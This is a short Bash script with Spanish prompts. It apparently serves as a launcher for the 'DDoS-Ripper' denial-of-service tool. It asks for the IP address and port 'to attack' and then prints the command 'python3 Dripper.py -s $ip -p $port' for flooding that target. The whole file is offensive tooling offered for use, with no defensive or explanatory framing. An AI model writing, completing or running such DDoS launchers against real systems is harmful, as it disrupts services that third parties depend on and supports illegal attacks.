#!/bin/bash
cd DDoS-Ripper
pwd
read -p "ingresa la ip que deseas atacar: " ip
clear
read -p "ingresa el puerto al cual deseas atacar " port
clear

echo "ip: $ip"
echo "puerto: $port"


echo " Ejecuta el siguiente comando:   python3 Dripper.py -s $ip -p $port "



